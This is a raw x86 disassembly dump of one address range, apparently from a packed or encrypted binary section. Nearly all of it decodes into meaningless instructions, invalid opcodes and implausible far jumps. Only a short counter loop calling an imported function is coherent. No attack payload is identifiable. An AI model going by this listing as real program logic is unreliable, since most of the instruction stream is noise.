  409f48:	add    eax,0xdef66f59
  409f4d:	mov    ecx,0x927a8d67
  409f52:	stos   BYTE PTR es:[edi],al
  409f53:	cdq    
  409f54:	pushf  
  409f55:	mov    dl,0xc3
  409f57:	into   
  409f58:	dec    ecx
  409f59:	adc    bh,BYTE PTR [ecx-0x48]
  409f5c:	mov    eax,0x6f52f12a
  409f61:	outs   dx,DWORD PTR ds:[esi]
  409f62:	sub    BYTE PTR [ecx+0x3d90d2fb],al
  409f68:	mov    edi,0xd4c37bac
  409f6d:	jns    0x409f9c
  409f6f:	enter  0xd478,0x91
  409f73:	push   edi
  409f74:	mov    BYTE PTR [edx-0x1c],bl
  409f77:	pop    eax
  409f78:	jmp    0x3f73:0xd5e4e783
  409f7f:	sub    eax,0x93401fb6
  409f84:	pop    ebx
  409f85:	jp     0x409ffb
  409f87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f88:	hlt    
  409f89:	popa   
  409f8a:	and    eax,DWORD PTR [esi-0x1a]
  409f8d:	fs dec esp
  409f8f:	dec    ebx
  409f90:	adc    DWORD PTR [edx-0x1],ecx
  409f93:	pop    es
  409f94:	in     eax,dx
  409f95:	in     al,dx
  409f96:	mov    ecx,0x42acf8ec
  409f9b:	add    DWORD PTR [ebx-0x662ab336],esi
  409fa1:	xor    ah,BYTE PTR [ecx+0x24]
  409fa4:	xchg   ebp,eax
  409fa5:	stos   DWORD PTR es:[edi],eax
  409fa6:	leave  
  409fa7:	sbb    eax,0x40364f58
  409fac:	shl    dh,cl
  409fae:	xor    BYTE PTR [ecx-0x40d13d67],al
  409fb4:	cmp    ch,BYTE PTR cs:[esi+0x6]
  409fb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409fb9:	xchg   edi,eax
  409fba:	nop
  409fbb:	sbb    ebp,ecx
  409fbd:	push   edx
  409fbe:	jecxz  0x40a038
  409fc0:	mov    edi,0xa4e86b55
  409fc5:	enter  0xb29c,0xd9
  409fc9:	imul   BYTE PTR [eax+ebx*1]
  409fcc:	mov    ds:0x9f20c2ae,al
  409fd1:	jl     0x409f55
  409fd3:	sub    eax,0xc016ab83
  409fd8:	out    0x67,al
  409fda:	pop    ds
  409fdb:	adc    ch,al
  409fdd:	mov    edx,0xdb38b37b
  409fe2:	in     al,0xf0
  409fe4:	test   BYTE PTR [edx-0x4e],dh
  409fe7:	popa   
  409fe8:	(bad)  
  409fe9:	mov    BYTE PTR [ebx],al
  409feb:	fcmove st,st(1)
  409fed:	lds    esi,FWORD PTR [edi]
  409fef:	lods   al,BYTE PTR ds:[esi]
  409ff0:	or     al,0x51
  409ff2:	popf   
  409ff3:	cmp    BYTE PTR [edx-0x2242c883],dl
  409ff9:	lahf   
  409ffa:	(bad)  
  409ffb:	push   0xcc702af3
  40a000:	and    al,0xf0
  40a002:	stos   BYTE PTR es:[edi],al
  40a003:	dec    ecx
  40a004:	push   ebx
  40a005:	jge    0x409f97
  40a007:	mov    BYTE PTR [esi+0x4a],cl
  40a00a:	and    DWORD PTR [edx-0x309a8dd4],edi
  40a010:	fwait
  40a011:	sti    
  40a012:	adc    BYTE PTR [esi+0x36],ch
  40a015:	hlt    
  40a016:	adc    dl,0x9d
  40a019:	mov    ah,cl
  40a01b:	push   edi
  40a01c:	sub    ch,BYTE PTR [edi-0x46]
  40a01f:	push   ss
  40a020:	add    al,0xb6
  40a022:	js     0x409fdd
  40a024:	retf   
  40a025:	mov    dh,dl
  40a027:	jo     0x40a067
  40a029:	sub    al,0x3a
  40a02b:	jmp    0x409fe4
  40a02d:	sbb    edx,DWORD PTR [esi]
  40a02f:	jmp    FWORD PTR [eax+0x591120b]
  40a035:	int    0xbb
  40a037:	and    eax,0x5dc9d91e
  40a03c:	pop    ebx
  40a03d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a03e:	mov    dh,BYTE PTR [edx]
  40a040:	mov    cl,0xe7
  40a042:	fwait
  40a043:	and    BYTE PTR [esi],ah
  40a045:	addr16 inc ebx
  40a047:	in     al,dx
  40a048:	jecxz  0x40a022
  40a04a:	sub    al,cl
  40a04c:	out    0xb3,al
  40a04e:	cmp    eax,0x2bbf9a60
  40a053:	or     al,0x71
  40a055:	and    al,0x44
  40a057:	cmp    BYTE PTR [edi],cl
  40a059:	test   al,0x8c
  40a05b:	jle    0x40a090
  40a05d:	pusha  
  40a05e:	mov    ecx,0x1a7d5d3c
  40a063:	out    dx,eax
  40a064:	sbb    al,0x86
  40a066:	cmp    edx,DWORD PTR [ecx-0x69]
  40a069:	sti    
  40a06a:	jno    0x40a0a9
  40a06c:	bound  edx,QWORD PTR [edx+esi*4-0x71]
  40a070:	rcl    esi,1
  40a072:	mov    al,ds:0xd95482f7
  40a077:	out    dx,eax
  40a078:	mov    esi,0xfe087d2b
  40a07d:	add    eax,DWORD PTR [ebx-0x6e]
  40a080:	sbb    al,0x4c
  40a082:	out    dx,eax
  40a083:	clc    
  40a084:	mov    ds,ecx
  40a086:	lds    eax,FWORD PTR [esi]
  40a088:	add    al,0x62
  40a08a:	pushf  
  40a08b:	mov    cl,0xf6
  40a08d:	xchg   al,ch
  40a08f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a090:	addr16 mov ebx,0x810f19a6
  40a096:	leave  
  40a097:	jmp    0x4bbc8a4b
  40a09c:	lock cmp eax,0x4e97cbc4
  40a0a2:	jecxz  0x40a035
  40a0a4:	jmp    0x7488:0xa4ff4d52
  40a0ab:	push   eax
  40a0ac:	std    
  40a0ad:	rol    DWORD PTR [ecx+edx*1-0x1f],cl
  40a0b1:	stos   BYTE PTR es:[edi],al
  40a0b2:	xor    edx,DWORD PTR [edi+0x391b28e8]
  40a0b8:	jns    0x40a120
  40a0ba:	push   ecx
  40a0bb:	in     al,0xab
  40a0bd:	sub    dl,dh
  40a0bf:	gs dec edi
  40a0c1:	loope  0x40a0ef
  40a0c3:	mov    WORD PTR [esi],gs
  40a0c5:	bound  eax,QWORD PTR es:[ebx]
  40a0c8:	or     eax,0x2e74957d
  40a0cd:	adc    dh,dh
  40a0cf:	(bad)  
  40a0d1:	ds add al,0xf5
  40a0d4:	cli    
  40a0d5:	push   0x53
  40a0d7:	std    
  40a0d8:	aaa    
  40a0d9:	(bad)  ds:0x3c595bcd
  40a0df:	outs   dx,DWORD PTR ds:[esi]
  40a0e0:	sti    
  40a0e1:	or     al,0x36
  40a0e3:	(bad)  
  40a0e4:	pop    edi
  40a0e5:	clc    
  40a0e6:	scas   al,BYTE PTR es:[edi]
  40a0e7:	mov    ds:0x6864dac2,al
  40a0ec:	aam    0x10
  40a0ee:	mov    eax,ds:0xbae5105e
  40a0f3:	inc    eax
  40a0f4:	add    DWORD PTR [edx-0x5d],ebp
  40a0f7:	fwait
  40a0f8:	pop    ecx
  40a0f9:	stc    
  40a0fa:	and    esp,DWORD PTR [edi+esi*2+0x44b73566]
  40a101:	not    BYTE PTR [edx+edi*8]
  40a104:	js     0x40a08f
  40a106:	cmp    cl,BYTE PTR [ebx]
  40a108:	sbb    esp,DWORD PTR [esi-0x26]
  40a10b:	lds    eax,FWORD PTR [ebx+0x5eb6ede3]
  40a111:	mov    ebx,ecx
  40a113:	xor    edi,ebx
  40a115:	push   es
  40a116:	xchg   ebx,eax
  40a117:	ja     0x40a140
  40a119:	stos   DWORD PTR es:[edi],eax
  40a11a:	adc    dl,bl
  40a11c:	fbld   TBYTE PTR fs:[ecx+eax*1]
  40a120:	aas    
  40a121:	push   ecx
  40a122:	jp     0x40a156
  40a124:	xor    eax,0x243832c0
  40a129:	or     BYTE PTR [ebx+ebp*1],dh
  40a12c:	push   ebp
  40a12d:	pop    edx
  40a12e:	test   al,0xc2
  40a130:	aad    0xdf
  40a132:	push   edi
  40a133:	cmp    al,0x3d
  40a135:	in     eax,dx
  40a136:	aam    0x44
  40a138:	iret   
  40a139:	adc    DWORD PTR [eax+0x55696813],esp
  40a13f:	xchg   ebx,eax
  40a140:	jge    0x40a16a
  40a142:	cmc    
  40a143:	call   0x99c0:0x1b484345
  40a14a:	mov    edi,0xbf71633e
  40a14f:	cmc    
  40a150:	lods   eax,DWORD PTR ds:[esi]
  40a151:	(bad)  
  40a153:	mov    ds:0x579589cc,al
  40a158:	pop    ecx
  40a159:	stc    
  40a15a:	aaa    
  40a15b:	lods   eax,DWORD PTR ds:[esi]
  40a15c:	inc    edi
  40a15d:	lock xrelease sub DWORD PTR [edi],ebx
  40a161:	aad    0xae
  40a163:	imul   esp,DWORD PTR [ebx-0x16],0x33
  40a167:	(bad)  
  40a168:	jmp    0x40a4b5
  40a16d:	push   ebp
  40a16e:	or     ah,al
  40a170:	int3   
  40a171:	popa   
  40a172:	hlt    
  40a173:	jno    0x40a108
  40a175:	jae    0x40a11f
  40a177:	and    dh,ah
  40a179:	mov    dh,0x61
  40a17b:	pushf  
  40a17c:	iret   
  40a17d:	cmp    edi,esp
  40a17f:	jle    0x40a1ff
  40a181:	cs jge 0x40a202
  40a184:	jle    0x40a199
  40a186:	mov    ebx,0x6259e4d6
  40a18b:	fs push es
  40a18d:	hlt    
  40a18e:	lock (bad) 
  40a190:	sub    eax,DWORD PTR [edi+0x6b]
  40a193:	push   cs
  40a194:	hlt    
  40a195:	add    BYTE PTR [ebp+0x45],bh
  40a198:	push   edx
  40a199:	lock aam 0x54
  40a19c:	cdq    
  40a19d:	jnp    0x40a173
  40a19f:	rcl    BYTE PTR [edi+0x440ef79b],cl
  40a1a5:	and    BYTE PTR ds:0xd637ebed,dl
  40a1ab:	mov    edx,0xfa9c3ea5
  40a1b0:	pop    es
  40a1b1:	(bad)  
  40a1b2:	outs   dx,DWORD PTR ds:[esi]
  40a1b3:	fs pop es
  40a1b5:	cwde   
  40a1b6:	xlat   BYTE PTR ds:[ebx]
  40a1b7:	push   0xfffffff2
  40a1b9:	into   
  40a1ba:	inc    ecx
  40a1bb:	dec    ebx
  40a1bc:	cmp    ch,BYTE PTR [ebx]
  40a1be:	leave  
  40a1bf:	fs mov edx,0x28688b32
  40a1c5:	xchg   esp,eax
  40a1c6:	in     eax,dx
  40a1c7:	push   cs
  40a1c8:	jp     0x40a178
  40a1ca:	mov    eax,ds:0xc3a46b6f
  40a1cf:	or     al,0xb
  40a1d1:	outs   dx,DWORD PTR ds:[esi]
  40a1d2:	push   ss
  40a1d3:	mov    eax,0xa9cba07c
  40a1d8:	not    DWORD PTR [ecx+eax*4+0x6c2ad267]
  40a1df:	pop    eax
  40a1e0:	imul   DWORD PTR [ebp+0x65]
  40a1e3:	push   cs
  40a1e4:	adc    edi,edi
  40a1e6:	loopne 0x40a17c
  40a1e8:	imul   ecx,DWORD PTR [eax],0x3941c80a
  40a1ee:	cli    
  40a1ef:	mov    bl,0xfa
  40a1f1:	(bad)  
  40a1f2:	mov    ah,BYTE PTR [ebp+0xd]
  40a1f5:	push   0xf45e128e
  40a1fa:	inc    edx
  40a1fb:	sbb    DWORD PTR [ecx+eiz*4-0x57],esi
  40a1ff:	ins    BYTE PTR es:[edi],dx
  40a200:	or     al,0x7e
  40a202:	fnstsw WORD PTR [ecx]
  40a204:	xor    al,0xbc
  40a206:	add    eax,0x893e151d
  40a20b:	jp     0x40a260
  40a20d:	shl    DWORD PTR [esp+ebp*2],1
  40a210:	in     al,dx
  40a211:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a212:	and    DWORD PTR [edx-0xa],0x66
  40a216:	xchg   DWORD PTR [esi+eax*8],eax
  40a219:	pop    ecx
  40a21a:	xchg   ecx,eax
  40a21b:	scas   eax,DWORD PTR es:[edi]
  40a21c:	daa    
  40a21d:	mov    WORD PTR [ecx+0x45],cs
  40a220:	sbb    esi,DWORD PTR [edi]
  40a222:	popa   
  40a223:	ins    BYTE PTR es:[edi],dx
  40a224:	cmp    ah,bh
  40a226:	cmp    dl,BYTE PTR gs:[ecx+0x6f624bac]
  40a22d:	call   0xc83:0x7cacff70
  40a234:	ret    
  40a235:	xor    BYTE PTR [edi+0x1cb3e935],ah
  40a23b:	ror    al,1
  40a23d:	xor    edx,DWORD PTR [esi-0x7b]
  40a240:	call   0x9149:0x4af61605
  40a247:	sub    bh,BYTE PTR [eax+0x31]
  40a24a:	ror    BYTE PTR [ecx],1
  40a24c:	mov    cl,0x32
  40a24e:	daa    
  40a24f:	adc    bl,BYTE PTR [ebp+eax*2-0x15]
  40a253:	imul   eax,DWORD PTR [ecx],0x28da6fd8
  40a259:	shl    BYTE PTR [esi-0xc2f23a6],1
  40a25f:	je     0x40a2a3
  40a261:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a262:	stos   BYTE PTR es:[edi],al
  40a263:	xor    DWORD PTR [edx],eax
  40a265:	xchg   ebp,eax
  40a266:	gs call 0xa1eadfad
  40a26c:	xchg   esi,eax
  40a26d:	adc    DWORD PTR [edi+0x62],0xffffffe5
  40a271:	popf   
  40a272:	push   ss
  40a273:	test   ah,dl
  40a275:	xchg   ecx,eax
  40a276:	adc    eax,0xa4bd5d07
  40a27b:	scas   al,BYTE PTR es:[edi]
  40a27c:	mov    bl,0x68
  40a27e:	hlt    
  40a27f:	scas   al,BYTE PTR es:[edi]
  40a280:	or     edx,DWORD PTR [bx+si]
  40a283:	jmp    0xb13c16e4
  40a288:	and    dl,BYTE PTR [edx+0x3]
  40a28b:	fld    DWORD PTR [edi]
  40a28d:	add    BYTE PTR [esi-0x78],ch
  40a290:	ins    DWORD PTR es:[edi],dx
  40a291:	pop    ecx
  40a292:	xchg   edx,eax
  40a293:	call   0x2da0:0xd782cb6d
  40a29a:	sub    esi,ebp
  40a29c:	sub    DWORD PTR [eax+0x1e],esi
  40a29f:	mov    eax,ds:0xdefa68ce
  40a2a4:	iret   
  40a2a5:	mov    ds:0x96e3090a,al
  40a2aa:	retf   0xebf3
  40a2ad:	cs (bad) 
  40a2af:	retf   
  40a2b0:	sar    BYTE PTR [eax-0x45544883],cl
  40a2b6:	or     al,0x5d
  40a2b8:	mov    esi,0x33138e5b
  40a2bd:	push   esp
  40a2be:	ret    
  40a2bf:	xor    dl,BYTE PTR [edx-0x1]
  40a2c2:	cmp    eax,0x8e317175
  40a2c7:	test   eax,0x9ac5058b
  40a2cc:	or     BYTE PTR [esp+ebp*4+0x3],dl
  40a2d0:	or     ecx,ecx
  40a2d2:	mov    edi,0x2072140d
  40a2d7:	(bad)  
  40a2d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a2d9:	xor    bl,BYTE PTR [ecx+0x57]
  40a2dc:	mov    ebp,0x35ddecad
  40a2e1:	push   ds
  40a2e2:	push   eax
  40a2e3:	in     al,0xfd
  40a2e5:	xor    ecx,DWORD PTR [edx]
  40a2e7:	mov    al,ds:0xa2860c2b
  40a2ec:	not    edi
  40a2ee:	outs   dx,DWORD PTR ds:[esi]
  40a2ef:	mov    esi,0x8a3e0ce4
  40a2f4:	push   ss
  40a2f5:	mov    ecx,0x831c076d
  40a2fa:	outs   dx,DWORD PTR ds:[esi]
  40a2fb:	out    dx,al
  40a2fc:	adc    DWORD PTR [eax-0x6b],ebp
  40a2ff:	(bad)  
  40a300:	sar    ebp,0xf
  40a303:	shr    DWORD PTR [esi-0x6],cl
  40a306:	pop    esp
  40a307:	hlt    
  40a308:	pushf  
  40a309:	fidiv  WORD PTR [esi+0x11e9d363]
  40a30f:	mov    ecx,0x8666bb0
  40a314:	jmp    0x5a63b12f
  40a319:	adc    esi,0xcf124d22
  40a31f:	xchg   ebx,eax
  40a320:	call   0x43b7fc74
  40a325:	(bad)  
  40a326:	pop    ebp
  40a327:	xchg   ebx,eax
  40a328:	leave  
  40a329:	in     al,dx
  40a32a:	aam    0x64
  40a32c:	outs   dx,BYTE PTR ds:[esi]
  40a32d:	ins    DWORD PTR es:[edi],dx
  40a32e:	test   al,dh
  40a330:	(bad)  
  40a331:	mov    edx,0xcf332b98
  40a336:	adc    ch,BYTE PTR [esi+0x34]
  40a339:	mov    edx,0xdf309f43
  40a33e:	push   ebp
  40a33f:	dec    esi
  40a340:	sbb    DWORD PTR [bp+si-0x67],ecx
  40a344:	in     eax,0xac
  40a346:	jge    0x40a337
  40a348:	bound  eax,QWORD PTR [eax-0x38]
  40a34b:	jge    0x40a39f
  40a34d:	and    BYTE PTR [esi],al
  40a34f:	and    al,0x76
  40a351:	xor    esp,DWORD PTR [ecx+0x188e6663]
  40a357:	jns    0x40a3a1
  40a359:	mov    eax,0xa04b6897
  40a35e:	outs   dx,BYTE PTR ds:[esi]
  40a35f:	adc    dh,BYTE PTR [ebx-0x78]
  40a362:	pusha  
  40a363:	stos   BYTE PTR es:[edi],al
  40a364:	jle    0x40a35a
  40a366:	ret    
  40a367:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a368:	clc    
  40a369:	xor    cl,BYTE PTR [esi+esi*4]
  40a36c:	sbb    eax,0xb967ac9c
  40a371:	jno    0x40a302
  40a373:	cmp    dl,bl
  40a375:	das    
  40a376:	sti    
  40a377:	bound  ebx,QWORD PTR [ebx+0x64]
  40a37a:	in     al,dx
  40a37b:	sub    BYTE PTR [ecx+0x40bdb720],bh
  40a381:	stos   BYTE PTR es:[edi],al
  40a382:	shl    BYTE PTR [eax],0xd5
  40a385:	inc    eax
  40a386:	jne    0x40a309
  40a388:	sub    ah,BYTE PTR [edi]
  40a38a:	mul    BYTE PTR ds:0xf4ebbdf3
  40a390:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a391:	ret    0x1ac3
  40a394:	mov    al,0x54
  40a396:	scas   al,BYTE PTR es:[edi]
  40a397:	stc    
  40a398:	inc    DWORD PTR [edi]
  40a39a:	imul   eax,DWORD PTR [esp+ecx*8-0x11b1d329],0xffffffa5
  40a3a2:	sub    ebx,DWORD PTR [ecx-0x48118eef]
  40a3a8:	fdivr  st(2),st
  40a3aa:	mov    edi,ss
  40a3ac:	int    0x37
  40a3ae:	jb     0x40a404
  40a3b0:	mov    ch,0xf3
  40a3b2:	fnsave [edx-0x7d]
  40a3b5:	retf   0x431f
  40a3b8:	xor    al,0x8
  40a3ba:	shl    DWORD PTR [ecx+0x37],cl
  40a3bd:	pop    ss
  40a3be:	adc    dh,BYTE PTR [esi+0x38]
  40a3c1:	(bad)  
  40a3c2:	repnz mov esp,0xaf87177c
  40a3c8:	adc    bl,cl
  40a3ca:	xor    DWORD PTR ds:0xf7ef6a47,0x9a1d9f20
  40a3d4:	xchg   ecx,eax
  40a3d5:	mov    ss,WORD PTR [edx+0x39a7d929]
  40a3db:	xor    DWORD PTR [edi-0x33d3b5f2],esp
  40a3e1:	mov    esi,0xa137bcfa
  40a3e6:	rcr    DWORD PTR [edi],cl
  40a3e8:	int    0x82
  40a3ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a3eb:	pop    esi
  40a3ec:	add    ecx,DWORD PTR [eax+0x24]
  40a3ef:	sti    
  40a3f0:	fstp   QWORD PTR [ebx-0x7f73459c]
  40a3f6:	jge    0x40a3f3
  40a3f8:	mov    ds:0x40c8dc0c,eax
  40a3fd:	add    al,bl
  40a3ff:	mov    eax,ds:0x4f347567
  40a404:	std    
  40a405:	ds mov ah,0x53
  40a408:	sub    al,0x32
  40a40a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a40b:	sub    dl,BYTE PTR [esi-0x7d]
  40a40e:	adc    esp,0x4798bf29
  40a414:	loop   0x40a494
  40a416:	pop    ebx
  40a417:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a418:	test   eax,0xad7e87bd
  40a41d:	ds and ecx,edx
  40a420:	retf   
  40a421:	xchg   edi,eax
  40a422:	fs dec edx
  40a424:	sbb    ecx,DWORD PTR [esp+edi*8]
  40a427:	imul   ebx,DWORD PTR fs:[eax-0x6c93112a],0x48488731
  40a432:	adc    dl,BYTE PTR [ebx]
  40a434:	adc    BYTE PTR [ebx+0x3],ch
  40a437:	mov    ah,0x48
  40a439:	nop
  40a43a:	retf   
  40a43b:	es mov ah,0x27
  40a43e:	jl     0x40a3db
  40a440:	dec    edx
  40a441:	call   0x5b47ca44
  40a446:	xchg   ebx,eax
  40a447:	in     eax,dx
  40a448:	fst    QWORD PTR [ecx+edi*1+0x40d8b206]
  40a44f:	mov    eax,0xa125d1af
  40a454:	fdivr  DWORD PTR [ecx]
  40a456:	ins    BYTE PTR es:[edi],dx
  40a457:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a458:	mov    bh,0x7c
  40a45a:	int3   
  40a45b:	xor    al,0x63
  40a45d:	ds std 
  40a45f:	jmp    0xdae9ce79
  40a464:	inc    ebp
  40a465:	sub    BYTE PTR [eax],0x7b
  40a468:	test   eax,0x8dfad3a3
  40a46d:	mov    ah,0x50
  40a46f:	jb     0x40a471
  40a471:	out    dx,al
  40a472:	mov    BYTE PTR ds:0xa7707b4c,ch
  40a478:	mov    dh,0x1c
  40a47a:	xchg   edx,eax
  40a47b:	dec    ecx
  40a47c:	out    0x11,eax
  40a47e:	pop    edi
  40a47f:	mov    esp,DWORD PTR [ecx+0x22a8afb2]
  40a485:	inc    ebx
  40a486:	lea    edx,[ebx+0x27696c88]
  40a48c:	xchg   ecx,eax
  40a48d:	das    
  40a48e:	ins    DWORD PTR es:[edi],dx
  40a48f:	sub    al,0xdf
  40a491:	dec    ebx
  40a492:	repz fcmovb st,st(1)
  40a495:	mov    esp,0x7f5190fd
  40a49a:	popw   es
  40a49c:	cmp    DWORD PTR ds:0xea6abcbf,edx
  40a4a2:	inc    ecx
  40a4a3:	and    DWORD PTR [edi+ebp*4-0x1684e273],eax
  40a4aa:	pop    ecx
  40a4ab:	je     0x40a511
  40a4ad:	jmp    0x40a4b8
  40a4af:	and    al,0x92
  40a4b1:	adc    esi,ecx
  40a4b3:	jecxz  0x40a4af
  40a4b5:	add    eax,edi
  40a4b7:	and    DWORD PTR ds:0x4303f1,0x0
  40a4c1:	xor    ebx,ebx
  40a4c3:	or     ebx,DWORD PTR ds:0x4303f1
  40a4c9:	inc    ebx
  40a4ca:	mov    DWORD PTR ds:0x4303f1,ebx
  40a4d0:	cmp    DWORD PTR ds:0x4303f1,0x2a
  40a4d7:	jne    0x40a4e8
  40a4dd:	push   0x43f7
  40a4e2:	call   DWORD PTR ds:0x42ebbb
  40a4e8:	cmp    DWORD PTR ds:0x4303f1,0x1d
  40a4ef:	jb     0x40a4c1
  40a4f5:	mov    DWORD PTR [ecx],eax
  40a4f7:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  40a4fe:	sub    ebx,ecx
  40a500:	jmp    0x40a84d
  40a505:	shr    BYTE PTR [esi],cl
  40a507:	mov    eax,0x736960ed
  40a50c:	xor    DWORD PTR [ebx],ebp
  40a50e:	jne    0x40a4fa
  40a510:	ss retf 0xccbb
  40a514:	pop    ds
  40a515:	jmp    0x2ebf23fc
  40a51a:	jge    0x40a59a
  40a51c:	jle    0x40a4b3
  40a51e:	xchg   edi,eax
  40a51f:	sub    al,0x2
  40a521:	ror    DWORD PTR [edx-0x47],0x42
  40a525:	jnp    0x40a4ba
  40a527:	jbe    0x40a558
  40a529:	sub    eax,0x632b470c
  40a52e:	loopne 0x40a4b7
  40a530:	pop    ebx
  40a531:	iret   
  40a532:	imul   ebp,DWORD PTR [edx+ebp*1],0xfffffffa
  40a536:	xchg   edx,eax
  40a537:	aaa    
  40a538:	adc    eax,0x5b91369
  40a53d:	shl    BYTE PTR [ecx],1
  40a53f:	mov    esp,0x9bbd0f4
  40a544:	retf   
  40a545:	adc    eax,0x833257cc
  40a54a:	dec    esi
  40a54b:	mov    DWORD PTR [ecx],ecx
  40a54d:	loopne 0x40a579
  40a54f:	aam    0x7
  40a551:	mov    cl,0x42
  40a553:	push   0x51
  40a555:	ficomp DWORD PTR [esp+ebx*1]
  40a558:	inc    edi
  40a559:	scas   al,BYTE PTR es:[edi]
  40a55a:	adc    eax,0x75869a6a
  40a55f:	out    dx,al
  40a560:	repz enter 0xf98a,0x87
  40a565:	dec    ebp
  40a566:	xchg   BYTE PTR ds:0x7c5a5e77,bh
  40a56c:	imul   ebp,DWORD PTR [edi],0xff881d85
  40a572:	les    ebx,FWORD PTR [eax]
  40a574:	ret    
  40a575:	jg     0x40a528
  40a577:	nop
  40a578:	lock and ebx,esp
  40a57b:	sahf   
  40a57c:	xchg   esp,eax
  40a57d:	or     al,BYTE PTR [ebx]
  40a57f:	daa    
  40a580:	bound  esi,QWORD PTR [edx+0x7460981]
  40a586:	sti    
  40a587:	rcr    BYTE PTR [ecx+0x77],1
  40a58a:	arpl   bp,dx
  40a58c:	pop    ds
  40a58d:	imul   ebp,DWORD PTR [eax-0x3fdee444],0x28
  40a594:	rol    BYTE PTR [ebp-0x492316c6],0xf5
  40a59b:	cmp    DWORD PTR [ebx+0x37164f08],ecx
  40a5a1:	call   0xb832:0xc96e246b
  40a5a8:	push   0x7
  40a5aa:	ficom  DWORD PTR [edi-0x3f]
  40a5ad:	jnp    0x40a607
  40a5af:	stc    
  40a5b0:	inc    esi
  40a5b1:	push   edi
  40a5b2:	push   ds
  40a5b3:	cs pop ss
  40a5b5:	pop    es
  40a5b6:	daa    
  40a5b7:	push   cs
  40a5b8:	inc    bh
  40a5ba:	mov    WORD PTR [edx-0x29],gs
  40a5bd:	ins    BYTE PTR es:[edi],dx
  40a5be:	outs   dx,BYTE PTR ds:[esi]
  40a5bf:	bound  ebx,QWORD PTR [ebp-0x3d68c381]
  40a5c5:	loop   0x40a5a8
  40a5c7:	cli    
  40a5c8:	or     dh,dl
  40a5ca:	xor    eax,0x85ddfbb6
  40a5cf:	dec    esp
  40a5d0:	ficom  DWORD PTR [esi+0x5051ed60]
  40a5d6:	and    dl,bh
  40a5d8:	out    0xf6,al
  40a5da:	sub    edx,DWORD PTR [ebp-0x70]
  40a5dd:	out    dx,al
  40a5de:	hlt    
  40a5df:	mov    ds:0x94114544,al
  40a5e4:	sar    DWORD PTR [ebp-0x74],0xd
  40a5e8:	dec    esi
  40a5e9:	or     DWORD PTR [ebx+esi*2],edx
  40a5ec:	scas   eax,DWORD PTR es:[edi]
  40a5ed:	mov    eax,0x3782248b
  40a5f2:	cmp    BYTE PTR [edx+0x5fef5348],al
  40a5f8:	in     al,0xc8
  40a5fa:	popf   
  40a5fb:	ret    0x689d
  40a5fe:	xchg   esp,eax
  40a5ff:	inc    ebp
  40a600:	in     al,dx
  40a601:	in     eax,0xc3
  40a603:	or     eax,0x388deb71
  40a608:	arpl   WORD PTR [ebx],si
  40a60a:	push   ebx
  40a60b:	push   eax
  40a60c:	adc    esp,DWORD PTR [eax+0x19]
  40a60f:	dec    esi
  40a610:	mov    dh,0x2a
  40a612:	pop    ds
  40a613:	inc    esi
  40a614:	rcl    dl,1
  40a616:	les    esp,FWORD PTR [esp+ebx*1+0x2825f820]
  40a61d:	cli    
  40a61e:	and    bl,al
  40a620:	mov    bh,BYTE PTR [bp+di+0x10]
  40a624:	bound  eax,QWORD PTR [ebx+edi*8+0x24]
  40a628:	loopne 0x40a668
  40a62a:	jecxz  0x40a634
  40a62c:	push   ss
  40a62d:	scas   al,BYTE PTR es:[edi]
  40a62e:	adc    BYTE PTR [ecx+0x5a],al
  40a631:	(bad)  
  40a632:	in     al,0x53
  40a634:	adc    al,0xa4
  40a636:	lods   al,BYTE PTR ds:[esi]
  40a637:	outs   dx,DWORD PTR ds:[esi]
  40a638:	sti    
  40a639:	or     bl,BYTE PTR [ecx+0x3ae843c1]
  40a63f:	out    0x5a,eax
  40a641:	cmp    ecx,eax
  40a643:	adc    eax,0x7edcedd7
  40a648:	cmp    bl,dh
  40a64a:	dec    edx
  40a64b:	or     dh,BYTE PTR [edi+ecx*4-0x5d]
  40a64f:	add    bl,dh
  40a651:	jg     0x40a5f5
  40a653:	cmp    cl,BYTE PTR cs:[ebx]
  40a656:	push   0x1b
  40a658:	dec    ebp
  40a659:	fwait
  40a65a:	mov    ebp,0xe2f05632
  40a65f:	into   
  40a660:	push   edi
  40a661:	sub    bh,BYTE PTR [edx-0x2a]
  40a664:	fstp   QWORD PTR [edx-0x4745cbbc]
  40a66a:	je     0x40a62e
  40a66c:	loopne 0x40a60b
  40a66e:	sub    BYTE PTR [ecx],dh
  40a670:	aas    
  40a671:	sti    
  40a672:	outs   dx,BYTE PTR ds:[esi]
  40a673:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a674:	xchg   ebp,eax
  40a675:	in     al,0xc
  40a677:	ret    
  40a678:	dec    ebx
  40a679:	pop    eax
  40a67a:	cmp    eax,0xdd24fdbf
  40a67f:	mov    al,0x67
  40a681:	jbe    0x40a623
  40a683:	inc    ebx
  40a684:	lods   al,BYTE PTR ds:[esi]
  40a685:	inc    esp
  40a686:	pushf  
  40a687:	fwait
  40a688:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a689:	adc    BYTE PTR [ecx+eiz*8-0x2a],0x63
  40a68e:	(bad)  
  40a68f:	clc    
  40a690:	pop    ss
  40a691:	push   DWORD PTR [esi]
  40a693:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a694:	jle    0x40a6b0
  40a696:	rol    ah,1
  40a698:	pop    ebp
  40a699:	arpl   WORD PTR [esi+0x15bcbce2],bx
  40a69f:	aas    
  40a6a0:	call   0x47f5e67e
  40a6a5:	mov    esp,0xa84b7157
  40a6aa:	rol    edx,cl
  40a6ac:	outs   dx,DWORD PTR ds:[esi]
  40a6ad:	dec    DWORD PTR [edx+0x5]
  40a6b0:	das    
  40a6b1:	ret    
  40a6b2:	adc    eax,0xda8d103b
  40a6b7:	cli    
  40a6b8:	jno    0x40a707
  40a6ba:	ret    0x3960
  40a6bd:	inc    ebp
